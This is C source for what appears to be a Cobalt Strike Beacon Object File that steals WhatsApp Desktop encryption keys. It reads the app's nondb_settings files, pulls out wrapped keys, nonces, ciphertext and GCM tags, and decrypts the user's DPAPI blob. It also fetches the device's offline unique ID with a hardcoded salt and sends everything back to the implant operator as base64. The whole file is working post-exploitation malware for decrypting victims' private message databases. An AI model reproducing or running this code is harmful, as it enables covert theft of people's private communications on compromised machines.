#include <windows.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <stdint.h>
#include <stdio.h>
#include "beacon.h"


DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT WINBASEAPI LPWSTR WINAPI SHLWAPI$PathCombineW(LPWSTR pszDest, LPCWSTR pszDir, LPCWSTR pszFile);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsW(LPCWSTR pszPath);
DECLSPEC_IMPORT WINBASEAPI LPSTR WINAPI SHLWAPI$StrStrA(LPCSTR lpFirst, LPCSTR lpSrch);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI void* WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$strlen(const char* _Str);
DECLSPEC_IMPORT WINBASEAPI void* __cdecl MSVCRT$memcpy(void* _Dst, const void* _Src, size_t _MaxCount);
DECLSPEC_IMPORT WINBASEAPI PCHAR __cdecl MSVCRT$strchr(const char* haystack, int needle);
DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$sprintf(char* __stream, const char* __format, ...);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
DECLSPEC_IMPORT WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
DECLSPEC_IMPORT WINBASEAPI UINT WINAPI OLEAUT32$SysStringByteLen(BSTR bstr);
DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$sscanf(const char*  _Src, const char* _Format, ...);
DECLSPEC_IMPORT WINBASEAPI long WINAPI MSVCRT$strtol(const char* nptr, char** endptr, int base);



#define CryptUnprotectData CRYPT32$CryptUnprotectData
#define CreateFileW KERNEL32$CreateFileW
#define GetLastError KERNEL32$GetLastError
#define GetFileSize KERNEL32$GetFileSize
#define ReadFile KERNEL32$ReadFile
#define PathCombineW SHLWAPI$PathCombineW
#define PathFileExistsW SHLWAPI$PathFileExistsW
#define StrStrA SHLWAPI$StrStrA
#define CloseHandle KERNEL32$CloseHandle
#define HeapAlloc KERNEL32$HeapAlloc
#define GetProcessHeap KERNEL32$GetProcessHeap
#define strlen MSVCRT$strlen
#define stchr MSVCRT$strchr
#define sprintf MSVCRT$sprintf
#define LocalFree KERNEL32$LocalFree
#define ExpandEnvironmentStringsW KERNEL32$ExpandEnvironmentStringsW
#define memcpy MSVCRT$memcpy
#define SysStringByteLen OLEAUT32$SysStringByteLen
#define strtol MSVCRT$strtol
#define WHATSAPP_DLL_PASSPHRASE "5303b14c0984e9b13fe75770cd25aaf7"
#define sscanf MSVCRT$sscanf



#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)

typedef enum {
    ODUID_DEFAULT = 0
} RETRIEVAL_METHOD;

// Function prototype
typedef int (*GetOfflineDeviceUniqueID_t)(
    unsigned int cbSalt,
    const BYTE* pbSalt,
    RETRIEVAL_METHOD* rm,
    unsigned int* cbSystemId,
    BYTE* rgbSystemId,
    int unused1,
    int unused2
    );

static const char encoding_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const int mod_table[] = { 0, 2, 1 };

void uidHexStringToByteArray(const char* hexString, unsigned char* byteArray, size_t* length) {
    size_t hexLen = strlen(hexString);
    if (hexLen % 2 != 0) return; // Invalid hex string

    *length = hexLen / 2;
    for (size_t i = 0; i < *length; i++) {
        sscanf(hexString + (i * 2), "%2hhx", &byteArray[i]);
    }
}

char* base64_encode(const BYTE* data, size_t input_length) {
    size_t output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = (char*)intAlloc(output_length + 1);
    if (encoded_data == NULL) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        encoded_data[j++] = encoding_table[(triple >> 18) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 12) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 6) & 0x3F];
        encoded_data[j++] = encoding_table[triple & 0x3F];
    }

    for (size_t i = 0; i < mod_table[input_length % 3]; i++) {
        encoded_data[output_length - 1 - i] = '=';
    }

    encoded_data[output_length] = '\0';
    return encoded_data;
}


int isBase64(char c) {
    return (c >= 'A' && c <= 'Z') ||    // Uppercase letters
        (c >= 'a' && c <= 'z') ||    // Lowercase letters
        (c >= '0' && c <= '9') ||    // Digits
        (c == '+') || (c == '/');    // '+' and '/'
}

void ConvertSaltToByteArray(const char* salt, unsigned char** pbSalt, size_t* cbSalt) {
    if (salt == NULL || pbSalt == NULL || cbSalt == NULL) {
        return;
    }

    size_t length = strlen(salt);
    *cbSalt = 0;

    if (length > 2 && salt[0] == '0' && salt[1] == 'x' && (length % 2 == 0)) {
        // Hex-encoded salt case
        *cbSalt = (length - 2) / 2;
        *pbSalt = (unsigned char*)intAlloc(*cbSalt);

        if (*pbSalt == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed");
        }

        for (size_t i = 2, j = 0; i < length; i += 2, j++) {
            char hexByte[3] = { salt[i], salt[i + 1], '\0' };
            (*pbSalt)[j] = (unsigned char)strtol(hexByte, NULL, 16);
        }
    }
    else {
        // ASCII string case
        *cbSalt = length;
        *pbSalt = (unsigned char*)intAlloc(*cbSalt);

        if (*pbSalt == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"Memory allocation failed");
        }

        memcpy(*pbSalt, salt, *cbSalt);
    }
}


char* ByteArrayToHexString(const BYTE* data, unsigned int length) {
    const char hexDigits[] = "0123456789ABCDEF";
    char* hexStr = (char*)intAlloc(length * 2 + 1); // Allocate memory
    if (!hexStr) return NULL; // Handle allocation failure

    for (unsigned int i = 0; i < length; i++) {
        hexStr[i * 2] = hexDigits[data[i] >> 4];      // High nibble
        hexStr[i * 2 + 1] = hexDigits[data[i] & 0x0F]; // Low nibble
    }
    hexStr[length * 2] = '\0'; // Null terminator
    return hexStr; // Caller must free()
}

int GetOfflineDeviceUniqueID(const char* salt) {
    HMODULE hModule = LoadLibraryA("clipc.dll");
    if (!hModule) {
        BeaconPrintf(CALLBACK_ERROR,"Error: Failed to load ClipcWrapper.dll\n");
        return -1;
    }

    GetOfflineDeviceUniqueID_t GetODUID = (GetOfflineDeviceUniqueID_t)GetProcAddress(hModule, "GetOfflineDeviceUniqueID");
    if (!GetODUID) {
        BeaconPrintf(CALLBACK_ERROR,"Error: Failed to resolve GetOfflineDeviceUniqueID\n");
        FreeLibrary(hModule);
        return -1;
    }

    size_t pbSaltLen = 0;
    unsigned int cbSystemId = 32;
    BYTE systemIdOut[32] = { 0 };
    RETRIEVAL_METHOD retrievalMethod = ODUID_DEFAULT;
    int result;

    unsigned char* pbSalt = NULL;
    size_t cbSalt = 0;

    // Convert salt string to byte array

    ConvertSaltToByteArray(salt, &pbSalt, &cbSalt);

    // Call the function
    result = GetODUID(cbSalt, pbSalt, &retrievalMethod, &cbSystemId, systemIdOut, 0, 0);
    
    if (result < 0) {
        BeaconPrintf(CALLBACK_ERROR,"Error: GetOfflineDeviceUniqueID failed with error: %d\n", result);
        FreeLibrary(hModule);
        return result;
    }
    
    //BeaconPrintf(CALLBACK_OUTPUT,"Method: %d\n", retrievalMethod);

    char* hexID = ByteArrayToHexString(systemIdOut, cbSystemId);
    
    BeaconOutput(CALLBACK_OUTPUT,hexID, strlen(hexID));
    
    intFree(hexID);

    FreeLibrary(hModule);
    return 0;
}

void HexStringToByteArray(const char* hexString, BYTE* byteArray) {
    size_t len = strlen(hexString);

    // Ensure that the string has an even number of characters
    if (len % 2 != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid hex string length.");
        return;
    }

    for (size_t i = 0; i < len; i += 2) {
        // Convert the two characters to a byte and store it
        byteArray[i / 2] = (BYTE)((hexString[i] > '9' ? (hexString[i] - 'a' + 10) : (hexString[i] - '0')) << 4 |
            (hexString[i + 1] > '9' ? (hexString[i + 1] - 'a' + 10) : (hexString[i + 1] - '0')));
    }
}


DWORD RetrieveDecryptionKey(LPCWSTR waPath) {
    DWORD dwErrorCode = ERROR_SUCCESS;
    HANDLE fp = NULL;
    DWORD filesize = 0;
    DWORD read = 0, totalread = 0;
    BYTE* filedata = 0, * key = 0;
    char* start = NULL;
    char* end = NULL;
    DWORD keylen = 0;


    fp = CreateFileW(waPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fp == INVALID_HANDLE_VALUE)
    {
        dwErrorCode = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "CreateFileW failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    filesize = GetFileSize(fp, NULL);
    if (filesize == INVALID_FILE_SIZE)
    {
        dwErrorCode = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "GetFileSize failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    filedata = (BYTE*)intAlloc(filesize);
    if (NULL == filedata)
    {
        dwErrorCode = ERROR_OUTOFMEMORY;
        BeaconPrintf(CALLBACK_ERROR, "intAlloc failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }
    while (totalread != filesize)
    {
        if (!ReadFile(fp, filedata + totalread, filesize - totalread, &read, NULL))
        {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "ReadFile failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        totalread += read;
        read = 0;
    }

    // Extract the 51st (0x33) and 52nd (0x34) bytes
    BYTE byte51 = filedata[0x33];
    BYTE byte52 = filedata[0x34];

    // Reverse byte order (Little-endian to Big-endian conversion)
    WORD dpapi_blob_size = (byte51 << 8) | byte52;

    //BeaconPrintf(CALLBACK_OUTPUT, "DPAPI Blob Size: 0x%04X (%d)", dpapi_blob_size, dpapi_blob_size);

    BYTE* dpapi_blob = &filedata[0x35];
    char* hexString = (char*)intAlloc((dpapi_blob_size * 2) + 1);
    char* p = hexString;
    for (int i = 0; i < dpapi_blob_size; i++) {
        p += sprintf(p, "%02X", dpapi_blob[i]);
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "DPAPI Blob: %s", hexString);
    //BeaconOutput(CALLBACK_OUTPUT, hexString, strlen(hexString));

    BYTE wrapped_key_size = filedata[0x177];

    // Step 2: Print the extracted wrapped key size
    //BeaconPrintf(CALLBACK_OUTPUT, "wrapped_key_size: %d (0x%02X)", wrapped_key_size, wrapped_key_size);

    // Step 3: Extract the wrapped key (starting at offset 0x178)
    BYTE* wrapped_key = &filedata[0x178];

    char* wpHexString = (char*)intAlloc((wrapped_key_size * 2) + 1);
    char* wpp = wpHexString;

    for (int i = 0; i < wrapped_key_size; i++) {
        wpp += sprintf(wpp, "%02X", wrapped_key[i]);  // Convert each byte to hex
    }

    // Step 6: Print the wrapped key as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "wrapped_key: %s", wpHexString);
    //BeaconOutput(CALLBACK_OUTPUT, wpHexString, strlen(wpHexString));
    char* b64wp = base64_encode(wrapped_key, wrapped_key_size);
    BeaconOutput(CALLBACK_OUTPUT, b64wp, strlen(b64wp));

    BYTE nonce_size = filedata[0x1BF];

    BYTE* nonce = &filedata[0x1C0];

    char* nonceHexString = (char*)intAlloc((nonce_size * 2) + 1);
    char* np = nonceHexString;

    for (int i = 0; i < nonce_size; i++) {
        np += sprintf(np, "%02X", nonce[i]);  // Convert each byte to hex
    }

    // Step 6: Print the nonce as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "nonce_size: %d", nonce_size);
    //BeaconPrintf(CALLBACK_OUTPUT, "nonce: %s", nonceHexString);
    //BeaconOutput(CALLBACK_OUTPUT, nonceHexString, strlen(nonceHexString));
    char* b64nonce = base64_encode(nonce, nonce_size);
    BeaconOutput(CALLBACK_OUTPUT, b64nonce, strlen(b64nonce));

    

    // Step 1: Extract cipher_text_size (byte at offset 0x1CE)
    BYTE cipher_text_size_byte1 = filedata[0x1D1];
    BYTE cipher_text_size_byte2 = filedata[0x1D2];

    WORD cipher_text_size = ((cipher_text_size_byte1 << 8) | cipher_text_size_byte2)-16;
    //BeaconPrintf(CALLBACK_OUTPUT, "cipher_text_size: %d", cipher_text_size);

    BYTE* cipher_text = &filedata[0x1D3];

    char* cHexString = (char*)intAlloc((cipher_text_size * 2) + 1);
    char* cp = cHexString;

    for (int i = 0; i < cipher_text_size; i++) {
        cp += sprintf(cp, "%02X", cipher_text[i]);  // Convert each byte to hex
    }

    // Step 6: Print the wrapped key as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "Ciphertext: %s", cHexString);
    //BeaconOutput(CALLBACK_OUTPUT, cHexString, strlen(cHexString));
    char* b64cip = base64_encode(cipher_text, cipher_text_size);
    BeaconOutput(CALLBACK_OUTPUT, b64cip, strlen(b64cip));

    BYTE* gcmTag = &filedata[0x1D3 + cipher_text_size];

    char* gcmHexString = (char*)intAlloc(33);
    char* gp = gcmHexString;

    for (int i = 0; i < 16; i++) {
        gp += sprintf(gp, "%02X", gcmTag[i]);
    }

    // Step 8: Print the GCM tag as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "gcmTag: %s", gcmHexString);
    //BeaconOutput(CALLBACK_OUTPUT, gcmHexString, strlen(gcmHexString));
    char* b64gcm = base64_encode(gcmTag, 16);
    BeaconOutput(CALLBACK_OUTPUT, b64gcm, strlen(b64gcm));


    BYTE whatsappDll_passphrase_bc[32];  // 16 bytes * 2 characters = 32

    // Convert hex string to byte array
    HexStringToByteArray(WHATSAPP_DLL_PASSPHRASE, whatsappDll_passphrase_bc);

    DATA_BLOB dpapiBlob;
    DATA_BLOB decryptedBlob;

    // Initialize dpapiBlob with the provided dpapi_blob
    dpapiBlob.pbData = dpapi_blob;
    dpapiBlob.cbData = dpapi_blob_size;

    // Unprotect (decrypt) the DPAPI blob with CurrentUser scope
    if (!CryptUnprotectData(&dpapiBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        BeaconPrintf(CALLBACK_ERROR, "Error: CryptUnprotectData failed with error code %lx\n", GetLastError());
        goto findKeyBlob_end;
    }
    char* encoded = NULL;
    encoded = base64_encode(decryptedBlob.pbData, decryptedBlob.cbData);
    if (encoded == NULL)
    {
        dwErrorCode = ERROR_DS_ENCODING_ERROR;
        BeaconPrintf(CALLBACK_ERROR, "base64_encode failed\n");
        goto findKeyBlob_end;
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted encryption key as: %s\n", encoded);
    BeaconOutput(CALLBACK_OUTPUT, encoded, strlen(encoded));
    LocalFree(decryptedBlob.pbData);
    decryptedBlob.pbData = NULL;

findKeyBlob_end:

    if (filedata)
    {
        intFree(filedata);
        filedata = NULL;
    }

    if (key)
    {
        intFree(key);
        key = NULL;
    }
    if (gcmHexString) {
        intFree(gcmHexString);
        gcmHexString = NULL;
    }
    if (cHexString) {
        intFree(cHexString);
        cHexString = NULL;
    }
    if (hexString) {
        intFree(hexString);
        hexString = NULL;
    }
    if (wpHexString) {
        intFree(wpHexString);
        wpHexString = NULL;
    }
    if (nonceHexString) {
        intFree(nonceHexString);
        nonceHexString = NULL;
    }

    if ((fp != NULL) && (fp != INVALID_HANDLE_VALUE))
    {
        CloseHandle(fp);
        fp = NULL;
    }

    return dwErrorCode;
}


DWORD RetrieveUserKey(LPCWSTR waPath) {
    DWORD dwErrorCode = ERROR_SUCCESS;
    HANDLE fp = NULL;
    DWORD filesize = 0;
    DWORD read = 0, totalread = 0;
    BYTE* filedata = 0, * key = 0;
    char* start = NULL;
    char* end = NULL;
    DWORD keylen = 0;


    fp = CreateFileW(waPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fp == INVALID_HANDLE_VALUE)
    {
        dwErrorCode = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "CreateFileW failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    filesize = GetFileSize(fp, NULL);
    if (filesize == INVALID_FILE_SIZE)
    {
        dwErrorCode = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "GetFileSize failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    filedata = (BYTE*)intAlloc(filesize);
    if (NULL == filedata)
    {
        dwErrorCode = ERROR_OUTOFMEMORY;
        BeaconPrintf(CALLBACK_ERROR, "intAlloc failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }
    while (totalread != filesize)
    {
        if (!ReadFile(fp, filedata + totalread, filesize - totalread, &read, NULL))
        {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "ReadFile failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        totalread += read;
        read = 0;
    }

    // Extract the 51st (0x33) and 52nd (0x34) bytes
    BYTE byte51 = filedata[0x33];
    BYTE byte52 = filedata[0x34];

    // Reverse byte order (Little-endian to Big-endian conversion)
    uint16_t dpapi_blob_size = (byte52 << 8) | byte51;

    //BeaconPrintf(CALLBACK_OUTPUT, "DPAPI Blob Size: 0x%04X (%d)", dpapi_blob_size, dpapi_blob_size);

    BYTE* dpapi_blob = &filedata[0x35];
    char* hexString = (char*)intAlloc((dpapi_blob_size * 2) + 1);
    char* p = hexString;
    for (int i = 0; i < dpapi_blob_size; i++) {
        p += sprintf(p, "%02X", dpapi_blob[i]); 
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "DPAPI Blob: %s", hexString);
    //BeaconOutput(CALLBACK_OUTPUT, hexString, strlen(hexString));

    BYTE wrapped_key_size = filedata[0x177];

    // Step 2: Print the extracted wrapped key size
    //BeaconPrintf(CALLBACK_OUTPUT, "wrapped_key_size: %d (0x%02X)", wrapped_key_size, wrapped_key_size);

    // Step 3: Extract the wrapped key (starting at offset 0x178)
    BYTE* wrapped_key = &filedata[0x178];

    char* wpHexString = (char*)intAlloc((wrapped_key_size * 2) + 1);
    char* wpp = wpHexString;

    for (int i = 0; i < wrapped_key_size; i++) {
        wpp += sprintf(wpp, "%02X", wrapped_key[i]);  // Convert each byte to hex
    }

    // Step 6: Print the wrapped key as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "wrapped_key: %s", wpHexString);
    //BeaconOutput(CALLBACK_OUTPUT, wpHexString, strlen(wpHexString));
    char* b64wp = base64_encode(wrapped_key, wrapped_key_size);
    BeaconOutput(CALLBACK_OUTPUT, b64wp, strlen(b64wp));

    BYTE nonce_size = filedata[0x1BD];
    
    BYTE* nonce = &filedata[0x1BE];

    char* nonceHexString = (char*)intAlloc((nonce_size * 2) + 1);
    char* np = nonceHexString;

    for (int i = 0; i < nonce_size; i++) {
        np += sprintf(np, "%02X", nonce[i]);  // Convert each byte to hex
    }

    
    // Step 6: Print the nonce as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "nonce_size: %d", nonce_size);
    //BeaconPrintf(CALLBACK_OUTPUT, "nonce: %s", nonceHexString);
    //BeaconOutput(CALLBACK_OUTPUT, nonceHexString, strlen(nonceHexString));
    char* b64nonce = base64_encode(nonce, nonce_size);
    BeaconOutput(CALLBACK_OUTPUT, b64nonce, strlen(b64nonce));

    // Step 1: Extract cipher_text_size (byte at offset 0x1CE)
    BYTE cipher_text_size = filedata[0x1CE] - 16;
    //BeaconPrintf(CALLBACK_OUTPUT, "cipher_text_size: %d", cipher_text_size);

    BYTE* cipher_text = &filedata[0x1CF];

    char* cHexString = (char*)intAlloc((cipher_text_size * 2) + 1);
    char* cp = cHexString;

    for (int i = 0; i < cipher_text_size; i++) {
        cp += sprintf(cp, "%02X", cipher_text[i]);  // Convert each byte to hex
    }

    char* b64ct = base64_encode(cipher_text, cipher_text_size);

    // Step 6: Print the wrapped key as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "Ciphertext: %s", cHexString);
    //BeaconOutput(CALLBACK_OUTPUT, cHexString, strlen(cHexString));
    BeaconOutput(CALLBACK_OUTPUT, b64ct, strlen(b64ct));

    BYTE* gcmTag = &filedata[0x1CF + cipher_text_size];

    char* gcmHexString = (char*)intAlloc(33);
    char* gp = gcmHexString;

    for (int i = 0; i < 16; i++) {
        gp += sprintf(gp, "%02X", gcmTag[i]);
    }

    

    // Step 8: Print the GCM tag as a Hex String
    //BeaconPrintf(CALLBACK_OUTPUT, "gcmTag: %s", gcmHexString);
    //BeaconOutput(CALLBACK_OUTPUT, gcmHexString, strlen(gcmHexString));
    char* b64gcm = base64_encode(gcmTag, 16);
    BeaconOutput(CALLBACK_OUTPUT,b64gcm , strlen(b64gcm));
    BYTE whatsappDll_passphrase_bc[32];  // 16 bytes * 2 characters = 32

    // Convert hex string to byte array
    char* b64pass = base64_encode(whatsappDll_passphrase_bc, 32);
    HexStringToByteArray(WHATSAPP_DLL_PASSPHRASE, whatsappDll_passphrase_bc);
    //BeaconOutput(CALLBACK_OUTPUT, WHATSAPP_DLL_PASSPHRASE, strlen(WHATSAPP_DLL_PASSPHRASE));
    //BeaconOutput(CALLBACK_OUTPUT, b64pass, strlen(b64pass));

    DATA_BLOB dpapiBlob;
    DATA_BLOB decryptedBlob;

    // Initialize dpapiBlob with the provided dpapi_blob
    dpapiBlob.pbData = dpapi_blob;
    dpapiBlob.cbData = dpapi_blob_size;

    // Unprotect (decrypt) the DPAPI blob with CurrentUser scope
    if (!CryptUnprotectData(&dpapiBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        BeaconPrintf(CALLBACK_ERROR,"Error: CryptUnprotectData failed with error code %lx\n", GetLastError());
        goto findKeyBlob_end;
    }
    char* encoded = NULL;
    encoded = base64_encode(decryptedBlob.pbData, decryptedBlob.cbData);
    if (encoded == NULL)
    {
        dwErrorCode = ERROR_DS_ENCODING_ERROR;
        BeaconPrintf(CALLBACK_ERROR, "base64_encode failed\n");
        goto findKeyBlob_end;
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted encryption key as: %s\n", encoded);
    BeaconOutput(CALLBACK_OUTPUT, encoded, strlen(encoded));
    LocalFree(decryptedBlob.pbData);
    decryptedBlob.pbData = NULL;


findKeyBlob_end:

    if (filedata)
    {
        intFree(filedata);
        filedata = NULL;
    }

    if (key)
    {
        intFree(key);
        key = NULL;
    }
    if (gcmHexString) {
        intFree(gcmHexString);
        gcmHexString = NULL;
    }
    if (cHexString) {
        intFree(cHexString);
        cHexString = NULL;
    }
    if (hexString) {
        intFree(hexString);
        hexString = NULL;
    }
    if (wpHexString) {
        intFree(wpHexString);
        wpHexString = NULL;
    }
    if (nonceHexString) {
        intFree(nonceHexString);
        nonceHexString = NULL;
    }

    if ((fp != NULL) && (fp != INVALID_HANDLE_VALUE))
    {
        CloseHandle(fp);
        fp = NULL;
    }

    return dwErrorCode;
}

DWORD RetrieveWhatsAppUserKey(wchar_t* localStatePath) {
    DWORD dwErrorCode = ERROR_SUCCESS;
    wchar_t waUserKeyPath[MAX_PATH] = { 0 };


    if (NULL == PathCombineW(waUserKeyPath, localStatePath, L"nondb_settings16.dat"))
    {
        dwErrorCode = ERROR_BAD_PATHNAME;
        goto retrieveuserkey_end;
    }
    if (PathFileExistsW(waUserKeyPath))
    {
        dwErrorCode = RetrieveUserKey(waUserKeyPath);
        if (ERROR_SUCCESS != dwErrorCode)
        {
            BeaconPrintf(CALLBACK_ERROR, "Retrieving Key from file failed %lX\n", dwErrorCode);
            //goto findKeyFiles_end;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not find WhatsApps's nondb_settings16.dat file\n");
    }
retrieveuserkey_end:
    return dwErrorCode;
}


DWORD RetrieveWhatsAppDBKey(char* dpapi_blob, size_t dpapi_blob_size) {
    DWORD dwErrorCode = ERROR_SUCCESS;

    DATA_BLOB dpapiBlob = {0};
    DATA_BLOB decryptedBlob = {0};
  
    if (!dpapi_blob){
        BeaconPrintf(CALLBACK_ERROR, "Error: DPAPI_BLOB was NULL");
        goto retrieveuserkey_end;
    }
    if (!dpapi_blob_size) {
        BeaconPrintf(CALLBACK_ERROR, "Error: DPAPI_BLOB_SIZE was NULL. Likely caused by other beacon activity interfering. Try again :)");
        goto retrieveuserkey_end;
    }

    BYTE* dpapi_blob_bytes = (BYTE*)intAlloc(dpapi_blob_size+3);
    if (dpapi_blob_bytes == NULL) {
        dwErrorCode = ERROR_DS_ENCODING_ERROR;
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed");
        goto retrieveuserkey_end;
    }
    uidHexStringToByteArray(dpapi_blob, dpapi_blob_bytes, &dpapi_blob_size);


    // Initialize dpapiBlob with the provided dpapi_blob
    dpapiBlob.pbData = dpapi_blob_bytes;
    dpapiBlob.cbData = dpapi_blob_size;

    // Unprotect (decrypt) the DPAPI blob with CurrentUser scope
    if (!CryptUnprotectData(&dpapiBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        BeaconPrintf(CALLBACK_ERROR, "Error: CryptUnprotectData failed with error code %lx\n", GetLastError());
        goto retrieveuserkey_end;
    }
    char* encoded = NULL;
    encoded = base64_encode(decryptedBlob.pbData, decryptedBlob.cbData);
    if (encoded == NULL)
    {
        dwErrorCode = ERROR_DS_ENCODING_ERROR;
        BeaconPrintf(CALLBACK_ERROR, "base64_encode failed\n");
        goto retrieveuserkey_end;
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted encryption key as: %s\n", encoded);
    BeaconOutput(CALLBACK_OUTPUT, encoded, strlen(encoded));
    LocalFree(decryptedBlob.pbData);
    decryptedBlob.pbData = NULL;

retrieveuserkey_end:
    if (dpapiBlob.pbData) {
        LocalFree(decryptedBlob.pbData);
        decryptedBlob.pbData = NULL;
    }
    if (dpapi_blob_bytes) {
        intFree(dpapi_blob_bytes);
        dpapi_blob_bytes = NULL;
    }
    return dwErrorCode;
}

DWORD RetrieveWhatsAppDecryptionKey(wchar_t* localStatePath) {
    DWORD dwErrorCode = ERROR_SUCCESS;
    wchar_t waUserKeyPath[MAX_PATH] = { 0 };


    if (NULL == PathCombineW(waUserKeyPath, localStatePath, L"nondb_settings18.dat"))
    {
        dwErrorCode = ERROR_BAD_PATHNAME;
        goto retrieveuserkey_end;
    }
    if (PathFileExistsW(waUserKeyPath))
    {
        dwErrorCode = RetrieveDecryptionKey(waUserKeyPath);
        if (ERROR_SUCCESS != dwErrorCode)
        {
            BeaconPrintf(CALLBACK_ERROR, "Retrieving Key from file failed %lX\n", dwErrorCode);
            //goto findKeyFiles_end;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not find WhatsApps's nondb_settings18.dat file\n");
    }
retrieveuserkey_end:
    return dwErrorCode;
}


void firstPhase(char* args, int len) {
    DWORD dwErrorCode = ERROR_SUCCESS;
    datap parser;
    DWORD userKey;
    BeaconDataParse(&parser, args, len);
    wchar_t* localStatePath = (wchar_t*)BeaconDataExtract(&parser, NULL);
    int result = GetOfflineDeviceUniqueID("0x6300760031006700310067007600");

    userKey = RetrieveWhatsAppUserKey(localStatePath);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "RetrieveWhatsAppUserKey failed: %lX\n", dwErrorCode);
    }
    dwErrorCode = RetrieveWhatsAppDecryptionKey(localStatePath);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "RetrieveWhatsAppDecryptionKey failed: %lX\n", dwErrorCode);
    }
}

void secondPhase(char* args, int len) {
    DWORD dwErrorCode = ERROR_SUCCESS;
    datap parser;
    BeaconDataParse(&parser, args, len);
    size_t dpapi_blob_size = BeaconDataInt(&parser);
    char* dpapi_blob = (char*)BeaconDataExtract(&parser, NULL);

    dwErrorCode = RetrieveWhatsAppDBKey(dpapi_blob, dpapi_blob_size);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "RetrieveWhatsAppUserKey failed: %lX\n", dwErrorCode);
    }
}